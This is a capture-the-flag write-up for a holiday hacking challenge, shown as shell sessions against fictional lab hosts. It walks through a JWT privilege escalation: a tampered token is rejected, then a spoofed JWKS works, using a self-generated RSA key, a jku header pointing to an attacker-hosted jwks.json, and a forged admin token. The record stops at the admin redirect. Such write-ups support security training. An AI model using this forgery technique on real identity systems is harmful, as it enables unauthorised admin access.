# Rogue Gnome Identity Provider

Difficulty: :material-star::material-star::material-star-outline::material-star-outline::material-star-outline:

## Objective

!!! question "Task description"

    Hike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?

??? quote "Paul Beckett"

    Hey, I’m Paul!

    I’ve been at Counter Hack since 2024 and loving every minute of it.

    I’m a pentester who digs into web, API, and mobile apps, and I’m also a fan of Linux.

    When I’m not hacking away, you can catch me enjoying board games, hiking, or paddle boarding!

    As a pentester, I proper love a good privilege escalation challenge, and that's exactly what we've got here.

    I've got access to a Gnome's Diagnostic Interface at gnome-48371.atnascorp with the creds gnome:SittingOnAShelf, but it's just a low-privilege account.

    The gnomes are getting some dodgy updates, and I need admin access to see what's actually going on.

    Ready to help me find a way to bump up our access level, yeah?

## Hints

??? tip "Rogue Gnome IDP"

    If you need to host any files for the attack, the server is running a webserver available locally at http://paulweb.neighborhood/ . The files for the site are stored in ~/www

??? tip "Rogue Gnome IDP"

    https://github.com/ticarpi/jwt_tool/wiki and https://portswigger.net/web-security/jwt have some great information on analyzing JWT's and performing JWT attacks.

??? tip "Rogue Gnome IDP"

    It looks like the JWT uses JWKS. Maybe a JWKS spoofing attack would work.

## Solution

??? success "Solution to question 1"

```
gnome-48371.atnascorp
gnome:SittingOnAShelf

paul@paulweb:~$ cat ~/notes
# Sites

## Captured Gnome:
curl http://gnome-48371.atnascorp/

## ATNAS Identity Provider (IdP):
curl http://idp.atnascorp/

## My CyberChef website:
curl http://paulweb.neighborhood/
### My CyberChef site html files:
~/www/


# Credentials

## Gnome credentials (found on a post-it):
Gnome:SittingOnAShelf


# Curl Commands Used in Analysis of Gnome:

## Gnome Diagnostic Interface authentication required page:
curl http://gnome-48371.atnascorp

## Request IDP Login Page
curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth

## Authenticate to IDP
curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login

## Pass Auth Token to Gnome
curl -v http://gnome-48371.atnascorp/auth?token=<insert-JWT>

## Access Gnome Diagnostic Interface
curl -H 'Cookie: session=<insert-session>' http://gnome-48371.atnascorp/diagnostic-interface

## Analyze the JWT
jwt_tool.py <insert-JWT>


paul@paulweb:~$ curl http://gnome-48371.atnascorp

<!DOCTYPE html>
<html>
<head>
    <title>AtnasCorp : Gnome Diagnostic Interface</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>

    <h1>AtnasCorp : Gnome Diagnostic Interface</h1>
    <form action="http://idp.atnascorp/" method="get">
        <input type="hidden" name="return_uri" value="http://gnome-48371.atnascorp/auth">
        <button type="submit">Authenticate</button>
    </form>

</body>




paul@paulweb:~$ curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth%2Fauth

<!DOCTYPE html>
<html>
<head>
    <title>AtnasCorp Identity Provider</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>
    <h1>AtnasCorp Identity Provider</h1>

    <!--img src="/images/reindeer_sleigh.png" alt="Reindeer pulling Santa's sleigh" style="width: 300px; margin-top: 20px;"-->
    <form method="POST" action="/login">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br>
        <button type="submit">Login</button>
    <input type='hidden' name='return_uri' value='http://gnome-48371.atnascorp/auth'></form>



paul@paulweb:~$ curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/loginp/login
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.WJOjijHMDhuV_yc1aQCBZGdUK0oX_NlxyRrwB0kMfTzH9x2NUpSjUoqgsFVanCzXnvtxrYxPRD9P6m-LeKteuJ5Y1QI44GbQqFG9hvu7JHp9irwCA722p_v8RhnvmHvegTuOVdCYWBdBcgg6gcy1QCQTIfMMPmwM9ZjeCaSAnt-TGK04CA0-e7CdB7WiQxfcur1RTSb9jVZEFhUG3WlXYHiZZ3D-QB8RI6m0OaHFzTOY3XW_K8EmW0Jk_8t8DyI2Vuo-CU_3g0qOura9EVt2jIMrBgqdHbTWOGaQXetZ7gZHLYtDdJhd2scGIFOGayzANGh9RK8allUk0VBtFL7UEg">http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.WJOjijHMDhuV_yc1aQCBZGdUK0oX_NlxyRrwB0kMfTzH9x2NUpSjUoqgsFVanCzXnvtxrYxPRD9P6m-LeKteuJ5Y1QI44GbQqFG9hvu7JHp9irwCA722p_v8RhnvmHvegTuOVdCYWBdBcgg6gcy1QCQTIfMMPmwM9ZjeCaSAnt-TGK04CA0-e7CdB7WiQxfcur1RTSb9jVZEFhUG3WlXYHiZZ3D-QB8RI6m0OaHFzTOY3XW_K8EmW0Jk_8t8DyI2Vuo-CU_3g0qOura9EVt2jIMrBgqdHbTWOGaQXetZ7gZHLYtDdJhd2scGIFOGayzANGh9RK8allUk0VBtFL7UEg</a>. If not, click the link.



jwt
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.WJOjijHMDhuV_yc1aQCBZGdUK0oX_NlxyRrwB0kMfTzH9x2NUpSjUoqgsFVanCzXnvtxrYxPRD9P6m-LeKteuJ5Y1QI44GbQqFG9hvu7JHp9irwCA722p_v8RhnvmHvegTuOVdCYWBdBcgg6gcy1QCQTIfMMPmwM9ZjeCaSAnt-TGK04CA0-e7CdB7WiQxfcur1RTSb9jVZEFhUG3WlXYHiZZ3D-QB8RI6m0OaHFzTOY3XW_K8EmW0Jk_8t8DyI2Vuo-CU_3g0qOura9EVt2jIMrBgqdHbTWOGaQXetZ7gZHLYtDdJhd2scGIFOGayzANGh9RK8allUk0VBtFL7UEg

{
  "alg": "RS256",
  "jku": "http://idp.atnascorp/.well-known/jwks.json",
  "kid": "idp-key-2025",
  "typ": "JWT"
}

{
  "sub": "gnome",
  "iat": 1763292869,
  "exp": 1763300069,
  "iss": "http://idp.atnascorp/",
  "admin": false
}

paul@paulweb:~$ jwt_tool.py eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.WJOjijHMDhuV_yc1aQCBZGdUK0oX_NlxyRrwB0kMfTzH9x2NUpSjUoqgsFVanCzXnvtxrYxPRD9P6m-LeKteuJ5Y1QI44GbQqFG9hvu7JHp9irwCA722p_v8RhnvmHvegTuOVdCYWBdBcgg6gcy1QCQTIfMMPmwM9ZjeCaSAnt-TGK04CA0-e7CdB7WiQxfcur1RTSb9jVZEFhUG3WlXYHiZZ3D-QB8RI6m0OaHFzTOY3XW_K8EmW0Jk_8t8DyI2Vuo-CU_3g0qOura9EVt2jIMrBgqdHbTWOGaQXetZ7gZHLYtDdJhd2scGIFOGayzANGh9RK8allUk0VBtFL7UEg

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.3.0                \______|             @ticarpi

/home/paul/.jwt_tool/jwtconf.ini
Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "RS256"
[+] jku = "http://idp.atnascorp/.well-known/jwks.json"
[+] kid = "idp-key-2025"
[+] typ = "JWT"

Token payload values:
[+] sub = "gnome"
[+] iat = 1763292869    ==> TIMESTAMP = 2025-11-16 11:34:29 (UTC)
[+] exp = 1763300069    ==> TIMESTAMP = 2025-11-16 13:34:29 (UTC)
[+] iss = "http://idp.atnascorp/"
[+] admin = False

Seen timestamps:
[*] iat was seen
[*] exp is later than iat by: 0 days, 2 hours, 0 mins

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------


paul@paulweb:~$ curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.WJOjijHMDhuV_yc1aQCBZGdUK0oX_NlxyRrwB0kMfTzH9x2NUpSjUoqgsFVanCzXnvtxrYxPRD9P6m-LeKteuJ5Y1QI44GbQqFG9hvu7JHp9irwCA722p_v8RhnvmHvegTuOVdCYWBdBcgg6gcy1QCQTIfMMPmwM9ZjeCaSAnt-TGK04CA0-e7CdB7WiQxfcur1RTSb9jVZEFhUG3WlXYHiZZ3D-QB8RI6m0OaHFzTOY3XW_K8EmW0Jk_8t8DyI2Vuo-CU_3g0qOura9EVt2jIMrBgqdHbTWOGaQXetZ7gZHLYtDdJhd2scGIFOGayzANGh9RK8allUk0VBtFL7UEg
* Host gnome-48371.atnascorp:80 was resolved.
* IPv6: (none)
* IPv4: 127.0.0.1
*   Trying 127.0.0.1:80...
* Connected to gnome-48371.atnascorp (127.0.0.1) port 80
> GET /auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.WJOjijHMDhuV_yc1aQCBZGdUK0oX_NlxyRrwB0kMfTzH9x2NUpSjUoqgsFVanCzXnvtxrYxPRD9P6m-LeKteuJ5Y1QI44GbQqFG9hvu7JHp9irwCA722p_v8RhnvmHvegTuOVdCYWBdBcgg6gcy1QCQTIfMMPmwM9ZjeCaSAnt-TGK04CA0-e7CdB7WiQxfcur1RTSb9jVZEFhUG3WlXYHiZZ3D-QB8RI6m0OaHFzTOY3XW_K8EmW0Jk_8t8DyI2Vuo-CU_3g0qOura9EVt2jIMrBgqdHbTWOGaQXetZ7gZHLYtDdJhd2scGIFOGayzANGh9RK8allUk0VBtFL7UEg HTTP/1.1
> Host: gnome-48371.atnascorp
> User-Agent: curl/8.5.0
> Accept: */*
>
< HTTP/1.1 302 FOUND
< Date: Sun, 16 Nov 2025 11:36:37 GMT
< Server: Werkzeug/3.0.1 Python/3.12.3
< Content-Type: text/html; charset=utf-8
< Content-Length: 229
< Location: /diagnostic-interface
< Vary: Cookie
< Set-Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aRm3RQ.as0b-rNHjVmlKdy9Qs5CFF9hniY; HttpOnly; Path=/
<
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/diagnostic-interface">/diagnostic-interface</a>. If not, click the link.
* Connection #0 to host gnome-48371.atnascorp left intact


paul@paulweb:~$ curl -H 'Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aRm3RQ.as0b-rNHjVmlKdy9Qs5CFF9hniY' http://gnome-48371.atnascorp/diagnostic-interface

<!DOCTYPE html>
<html>
<head>
    <title>AtnasCorp : Gnome Diagnostic Interface</title>
    <link rel="stylesheet" type="text/css" href="/static/styles/styles.css">
</head>
<body>
<h1>AtnasCorp : Gnome Diagnostic Interface</h1>
<p>Welcome gnome</p><p>Diagnostic access is only available to admins.</p>

</body>


==== altered jwt token

https://www.gavinjl.me/edit-jwt-online-alg-none/

eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.WJOjijHMDhuV_yc1aQCBZGdUK0oX_NlxyRrwB0kMfTzH9x2NUpSjUoqgsFVanCzXnvtxrYxPRD9P6m-LeKteuJ5Y1QI44GbQqFG9hvu7JHp9irwCA722p_v8RhnvmHvegTuOVdCYWBdBcgg6gcy1QCQTIfMMPmwM9ZjeCaSAnt-TGK04CA0-e7CdB7WiQxfcur1RTSb9jVZEFhUG3WlXYHiZZ3D-QB8RI6m0OaHFzTOY3XW_K8EmW0Jk_8t8DyI2Vuo-CU_3g0qOura9EVt2jIMrBgqdHbTWOGaQXetZ7gZHLYtDdJhd2scGIFOGayzANGh9RK8allUk0VBtFL7UEg


paul@paulweb:~$ curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.WJOjijHMDhuV_yc1aQCBZGdUK0oX_NlxyRrwB0kMfTzH9x2NUpSjUoqgsFVanCzXnvtxrYxPRD9P6m-LeKteuJ5Y1QI44GbQqFG9hvu7JHp9irwCA722p_v8RhnvmHvegTuOVdCYWBdBcgg6gcy1QCQTIfMMPmwM9ZjeCaSAnt-TGK04CA0-e7CdB7WiQxfcur1RTSb9jVZEFhUG3WlXYHiZZ3D-QB8RI6m0OaHFzTOY3XW_K8EmW0Jk_8t8DyI2Vuo-CU_3g0qOura9EVt2jIMrBgqdHbTWOGaQXetZ7gZHLYtDdJhd2scGIFOGayzANGh9RK8allUk0VBtFL7UEg
* Host gnome-48371.atnascorp:80 was resolved.
* IPv6: (none)
* IPv4: 127.0.0.1
*   Trying 127.0.0.1:80...
* Connected to gnome-48371.atnascorp (127.0.0.1) port 80
> GET /auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.WJOjijHMDhuV_yc1aQCBZGdUK0oX_NlxyRrwB0kMfTzH9x2NUpSjUoqgsFVanCzXnvtxrYxPRD9P6m-LeKteuJ5Y1QI44GbQqFG9hvu7JHp9irwCA722p_v8RhnvmHvegTuOVdCYWBdBcgg6gcy1QCQTIfMMPmwM9ZjeCaSAnt-TGK04CA0-e7CdB7WiQxfcur1RTSb9jVZEFhUG3WlXYHiZZ3D-QB8RI6m0OaHFzTOY3XW_K8EmW0Jk_8t8DyI2Vuo-CU_3g0qOura9EVt2jIMrBgqdHbTWOGaQXetZ7gZHLYtDdJhd2scGIFOGayzANGh9RK8allUk0VBtFL7UEg HTTP/1.1
> Host: gnome-48371.atnascorp
> User-Agent: curl/8.5.0
> Accept: */*
>
< HTTP/1.1 302 FOUND
< Date: Sun, 16 Nov 2025 11:49:02 GMT
< Server: Werkzeug/3.0.1 Python/3.12.3
< Content-Type: text/html; charset=utf-8
< Content-Length: 229
< Location: /?error=invalid-token
<
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/?error=invalid-token">/?error=invalid-token</a>. If not, click the link.
* Connection #0 to host gnome-48371.atnascorp left intact



=== jwks spoof

paul@paulweb:~$ curl -v http://idp.atnascorp/.well-known/jwks.json
* Host idp.atnascorp:80 was resolved.
* IPv6: (none)
* IPv4: 127.0.0.1
*   Trying 127.0.0.1:80...
* Connected to idp.atnascorp (127.0.0.1) port 80
> GET /.well-known/jwks.json HTTP/1.1
> Host: idp.atnascorp
> User-Agent: curl/8.5.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Sun, 16 Nov 2025 11:59:30 GMT
< Server: Werkzeug/3.0.1 Python/3.12.3
< Content-Type: application/json
< Content-Length: 476
<
{
  "keys": [
    {
      "e": "AQAB",
      "kid": "idp-key-2025",
      "kty": "RSA",
      "n": "7WWfvxwIZ44wIZqPFP9EEemmwMhKgBakYPx736W5gGD8YJlmMzanxdi8NANJ6kyMN-ErFOKJuIQn01PmAeq7On4OCwLyQpB5dHXiidZPRjb2lbrrL1k32svdeo6VGCnzdrGu6KtDHxHn8m9H3WqGVmi2OmCZsk6fJbnoklnJaFiygUkC4IMbk92cbYvajPTqV9C6yWCROPagxQFmybq1hNJoY-FRntEKwBN89Dow8d-PsGMten3CmzDQ9o8rXKs6euk9xLfX06og5Wm1aKJk686WzhtqgdmBjqt2w34EJGlEL0ZSvPdB9nPqxao83N-ah-IYeoiCnSUBKjXI-IRSjQ",
      "use": "sig"
    }
  ]
}
* Connection #0 to host idp.atnascorp left intact


https://techdocs.akamai.com/iot-token-access-control/docs/generate-rsa-keys

openssl genrsa -out jwtRSA256-private.pem 2048
openssl rsa -in jwtRSA256-private.pem -pubout -outform PEM -out jwtRSA256-public.pem

paul@paulweb:~$ openssl rsa -in jwtRSA256-public.pem -pubin -text -noout
Public-Key: (2048 bit)
Modulus:
    00:8c:db:fa:3c:33:05:75:5e:39:c8:0e:b9:21:44:
    64:e2:13:2c:40:ad:6e:e4:47:69:7d:1b:24:1d:e9:
    50:fb:2b:50:91:53:64:e4:07:b4:63:d4:91:5a:67:
    dd:b8:de:90:86:3a:b6:52:7c:91:21:21:60:d7:8f:
    79:b7:28:59:22:0a:46:9a:0a:08:58:39:44:28:14:
    6c:98:79:bb:33:85:e5:9d:1a:6f:16:d0:62:89:56:
    fb:be:dd:b1:b8:af:ff:81:c1:2c:b6:70:43:27:f6:
    e2:26:a1:c1:a0:59:fb:b5:d4:d5:47:e2:57:be:fd:
    a0:4d:1f:32:5c:41:ec:ef:a9:ee:1a:3e:7a:29:53:
    b2:61:71:ea:1c:c3:f0:34:98:ec:21:58:96:ba:09:
    cb:43:5f:eb:47:08:a7:da:8d:ca:63:ee:e0:d5:0a:
    b5:fd:33:24:43:e5:cb:fc:c6:9d:f9:db:3d:df:da:
    db:b4:93:c9:d7:f3:b1:ea:5d:2d:c9:a1:35:99:9f:
    b9:c0:56:01:3d:42:72:c1:25:2c:a8:c6:fa:cc:43:
    4f:2e:9d:20:2a:52:3e:ab:6a:c6:f8:4a:aa:c5:8b:
    ac:0c:f2:91:2e:48:86:4c:a3:59:11:f9:41:c3:eb:
    e2:ff:47:37:bc:83:3a:e0:0d:e2:b3:88:6c:ba:2a:
    e1:c1
Exponent: 65537 (0x10001)

printf "008cdbfa3c3305755e39c80eb9214464e2132c40ad6ee447697d1b241de950fb2b50915364e407b463d4915a67ddb8de90863ab6527c91212160d78f79b72859220a469a0a0858394428146c9879bb3385e59d1a6f16d0628956fbbeddb1b8afff81c12cb6704327f6e226a1c1a059fbb5d4d547e257befda04d1f325c41ecefa9ee1a3e7a2953b26171ea1cc3f03498ec215896ba09cb435feb4708a7da8dca63eee0d50ab5fd332443e5cbfcc69df9db3ddfdadbb493c9d7f3b1ea5d2dc9a135999fb9c056013d4272c1252ca8c6facc434f2e9d202a523eab6ac6f84aaac58bac0cf2912e48864ca35911f941c3ebe2ff4737bc833ae00de2b3886cba2ae1c1" | xxd -r -p > modulus.bin

paul@paulweb:~$ cat modulus.bin | openssl base64 -A   | tr '+/' '-_'   | tr -d '='
AIzb-jwzBXVeOcgOuSFEZOITLECtbuRHaX0bJB3pUPsrUJFTZOQHtGPUkVpn3bjekIY6tlJ8kSEhYNePebcoWSIKRpoKCFg5RCgUbJh5uzOF5Z0abxbQYolW-77dsbiv_4HBLLZwQyf24iahwaBZ-7XU1UfiV779oE0fMlxB7O-p7ho-eilTsmFx6hzD8DSY7CFYlroJy0Nf60cIp9qNymPu4NUKtf0zJEPly_zGnfnbPd_a27STydfzsepdLcmhNZmfucBWAT1CcsElLKjG-sxDTy6dICpSPqtqxvhKqsWLrAzykS5IhkyjWRH5QcPr4v9HN7yDOuAN4rOIbLoq4cE

AI USAGE




paul@paulweb:~$ curl http://paulweb.neighborhood/jwks.json
{
  "keys": [
    {
      "e": "AQAB",
      "kid": "custom",
      "kty": "RSA",
      "n": "AIzb-jwzBXVeOcgOuSFEZOITLECtbuRHaX0bJB3pUPsrUJFTZOQHtGPUkVpn3bjekIY6tlJ8kSEhYNePebcoWSIKRpoKCFg5RCgUbJh5uzOF5Z0abxbQYolW-77dsbiv_4HBLLZwQyf24iahwaBZ-7XU1UfiV779oE0fMlxB7O-p7ho-eilTsmFx6hzD8DSY7CFYlroJy0Nf60cIp9qNymPu4NUKtf0zJEPly_zGnfnbPd_a27STydfzsepdLcmhNZmfucBWAT1CcsElLKjG-sxDTy6dICpSPqtqxvhKqsWLrAzykS5IhkyjWRH5QcPr4v9HN7yDOuAN4rOIbLoq4cE",
      "use": "sig"
    }
  ]
}


sign altered jwt token
https://techdocs.akamai.com/iot-token-access-control/docs/generate-jwt-rsa-keys#signature

paul@paulweb:~/www$ echo -n "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJjdXN0b20iLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0" | openssl dgst -sha256 -binary -sign ../jwtRSA256-private.pem  | openssl enc -base64 | tr -d '\n=' | tr -- '+/' '-_'
e6FG_5Uv1V-pIqZoOg0OUitLPurOHBzABNdyQ2cpg0jzWNDXb6YfBEa8SlmrvT00l_Zy3cbSpiPy8CdkGMqNQb4IKYR2qw0Mlx7iI1aUwVZhh3pW5okwDLPEWxXu6XlTVKLpFJuyPzTxpQe77HM8z9dv15iEkYI_tgAJX9cCv_IjXiSBo8cJP9HM_nRwTmytHCEKyHeUm6p_SaMRatGFt9MBWHrPqQtcX7wdDFXAHZmzMz08Cpf_QDhDldY3HqgzSJGOxbEdXEh-IlFpF2jVxoD4mI0xobpJnzlxEnJ6A56YBPuy33vUW1QFsvbTT9HFI25fQdS9rSMycQ5KVF13YA

self-signed altered jwt token

eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJjdXN0b20iLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.e6FG_5Uv1V-pIqZoOg0OUitLPurOHBzABNdyQ2cpg0jzWNDXb6YfBEa8SlmrvT00l_Zy3cbSpiPy8CdkGMqNQb4IKYR2qw0Mlx7iI1aUwVZhh3pW5okwDLPEWxXu6XlTVKLpFJuyPzTxpQe77HM8z9dv15iEkYI_tgAJX9cCv_IjXiSBo8cJP9HM_nRwTmytHCEKyHeUm6p_SaMRatGFt9MBWHrPqQtcX7wdDFXAHZmzMz08Cpf_QDhDldY3HqgzSJGOxbEdXEh-IlFpF2jVxoD4mI0xobpJnzlxEnJ6A56YBPuy33vUW1QFsvbTT9HFI25fQdS9rSMycQ5KVF13YA

paul@paulweb:~/www$ curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJjdXN0b20iLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.e6FG_5Uv1V-pIqZoOg0OUitLPurOHBzABNdyQ2cpg0jzWNDXb6YfBEa8SlmrvT00l_Zy3cbSpiPy8CdkGMqNQb4IKYR2qw0Mlx7iI1aUwVZhh3pW5okwDLPEWxXu6XlTVKLpFJuyPzTxpQe77HM8z9dv15iEkYI_tgAJX9cCv_IjXiSBo8cJP9HM_nRwTmytHCEKyHeUm6p_SaMRatGFt9MBWHrPqQtcX7wdDFXAHZmzMz08Cpf_QDhDldY3HqgzSJGOxbEdXEh-IlFpF2jVxoD4mI0xobpJnzlxEnJ6A56YBPuy33vUW1QFsvbTT9HFI25fQdS9rSMycQ5KVF13YA
* Host gnome-48371.atnascorp:80 was resolved.
* IPv6: (none)
* IPv4: 127.0.0.1
*   Trying 127.0.0.1:80...
* Connected to gnome-48371.atnascorp (127.0.0.1) port 80
> GET /auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJjdXN0b20iLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2MzI5Mjg2OSwiZXhwIjoxNzYzMzAwMDY5LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.e6FG_5Uv1V-pIqZoOg0OUitLPurOHBzABNdyQ2cpg0jzWNDXb6YfBEa8SlmrvT00l_Zy3cbSpiPy8CdkGMqNQb4IKYR2qw0Mlx7iI1aUwVZhh3pW5okwDLPEWxXu6XlTVKLpFJuyPzTxpQe77HM8z9dv15iEkYI_tgAJX9cCv_IjXiSBo8cJP9HM_nRwTmytHCEKyHeUm6p_SaMRatGFt9MBWHrPqQtcX7wdDFXAHZmzMz08Cpf_QDhDldY3HqgzSJGOxbEdXEh-IlFpF2jVxoD4mI0xobpJnzlxEnJ6A56YBPuy33vUW1QFsvbTT9HFI25fQdS9rSMycQ5KVF13YA HTTP/1.1
> Host: gnome-48371.atnascorp
> User-Agent: curl/8.5.0
> Accept: */*
>
< HTTP/1.1 302 FOUND
< Date: Sun, 16 Nov 2025 12:31:12 GMT
< Server: Werkzeug/3.0.1 Python/3.12.3
< Content-Type: text/html; charset=utf-8
< Content-Length: 229
< Location: /diagnostic-interface
< Vary: Cookie
< Set-Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aRnEEA.a8PDShbSAlNFpOTirEfpVicYmbU; HttpOnly; Path=/
<
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/diagnostic-interface">/diagnostic-interface</a>. If not, click the link.
* Connection #0 to host gnome-48371.atnascorp left intact


